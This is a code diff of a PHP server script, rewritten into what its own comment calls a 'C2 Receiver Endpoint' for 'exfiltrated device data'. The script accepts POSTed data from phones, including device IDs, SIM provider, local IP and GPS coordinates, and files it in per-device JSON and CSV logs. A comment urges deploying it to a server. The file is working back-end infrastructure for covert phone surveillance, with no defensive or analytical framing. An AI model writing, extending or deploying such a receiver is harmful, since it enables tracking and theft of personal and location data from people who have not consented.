@@ -1,59 +1,90 @@
 <?php
-// CORS pre-flight handling
+// C2 Receiver Endpoint - receives exfiltrated device data
+// Deploy this to your server (e.g., onrender.com, VPS, etc.)
+
+header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type, X-Request-ID');
+
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    header('Access-Control-Allow-Origin: *');
-    header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
-    header('Access-Control-Allow-Headers: Content-Type');
     http_response_code(200);
     exit;
 }
 
-// Path to data log (outside public folder, one level up)
-$logFile = __DIR__ . '/../collected_data.json';
-
-// Serve the log file when requested directly
-$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-if ($uri === '/collected_data.json') {
-    header('Content-Type: application/json');
-    header('Access-Control-Allow-Origin: *');
-    if (file_exists($logFile)) {
-        readfile($logFile);
-    } else {
-        echo '[]';
-    }
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(405);
+    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
     exit;
 }
 
-// Handle incoming POST data (from the Android app)
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    header('Content-Type: application/json');
-    header('Access-Control-Allow-Origin: *');
-    $rawInput = file_get_contents('php://input');
-    $data = json_decode($rawInput, true);
-    if ($data === null) {
-        http_response_code(400);
-        echo json_encode(['error' => 'invalid_json', 'received' => $rawInput]);
-        exit;
-    }
-    // Determine client IP safely
-    $clientIP = $_SERVER['HTTP_X_FORWARDED_FOR'] ??
-                $_SERVER['HTTP_X_REAL_IP'] ??
-                $_SERVER['REMOTE_ADDR'] ??
-                'unknown';
-    $entry = [
-        'timestamp'   => date('Y-m-d H:i:s'),
-        'client_ip'   => $clientIP,
-        'user_agent'  => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
-        'device'      => $data,
-    ];
-    // Append entry atomically
-    file_put_contents($logFile, json_encode($entry) . "\n", FILE_APPEND | LOCK_EX);
-    http_response_code(200);
-    echo json_encode(['status' => 'ok']);
+$rawInput = file_get_contents('php://input');
+$payload = json_decode($rawInput, true);
+
+if (!$payload || !isset($payload['segment'])) {
+    http_response_code(400);
+    echo json_encode(['status' => 'error', 'message' => 'Invalid payload']);
     exit;
 }
 
-// Fallback for simple GET health check
+$deviceId = $payload['device_id'] ?? $payload['install_token'] ?? 'unknown';
+$segment = (int)$payload['segment'];
+$timestamp = date('Y-m-d_H-i-s');
+$safeId = preg_replace('/[^a-zA-Z0-9_-]/', '_', $deviceId);
+
+// Ensure storage directory exists
+$storageDir = __DIR__ . '/data/' . $safeId;
+if (!is_dir($storageDir)) {
+    mkdir($storageDir, 0755, true);
+}
+
+// Write segment data to daily log file
+$dailyFile = $storageDir . '/session_' . $timestamp . '.json';
+$existing = [];
+if (file_exists($dailyFile)) {
+    $existing = json_decode(file_get_contents($dailyFile), true) ?: [];
+}
+
+$existing['device_id'] = $deviceId;
+$existing['install_token'] = $payload['install_token'] ?? '';
+$existing['device_model'] = $payload['device_model'] ?? '';
+$existing['device_brand'] = $payload['device_brand'] ?? '';
+$existing['os_version'] = $payload['os_version'] ?? '';
+$existing['sim_provider'] = $payload['sim_provider'] ?? '';
+$existing['local_ip'] = $payload['local_ip'] ?? '';
+$existing['lat'] = $payload['lat'] ?? null;
+$existing['lng'] = $payload['lng'] ?? null;
+$existing['seq'] = $payload['seq'] ?? 0;
+$existing['last_segment'] = $segment;
+$existing['last_seen'] = time();
+$existing['segments'][$segment] = [
+    'received_at' => date('c'),
+    'data' => $payload
+];
+
+file_put_contents($dailyFile, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+
+// Also append to a master CSV for quick review
+$csvFile = $storageDir . '/log.csv';
+$isNew = !file_exists($csvFile);
+$fp = fopen($csvFile, 'a');
+if ($isNew) {
+    fputcsv($fp, ['timestamp', 'device_id', 'model', 'brand', 'os', 'sim', 'ip', 'lat', 'lng', 'segment', 'seq']);
+}
+fputcsv($fp, [
+    date('c'),
+    $deviceId,
+    $payload['device_model'] ?? '',
+    $payload['device_brand'] ?? '',
+    $payload['os_version'] ?? '',
+    $payload['sim_provider'] ?? '',
+    $payload['local_ip'] ?? '',
+    $payload['lat'] ?? '',
+    $payload['lng'] ?? '',
+    $segment,
+    $payload['seq'] ?? 0
+]);
+fclose($fp);
+
 http_response_code(200);
-echo json_encode(['status' => 'online', 'message' => 'API is running.']);
-?>
+echo json_encode(['status' => 'ok', 'segment' => $segment, 'seq' => $payload['seq'] ?? 0]);
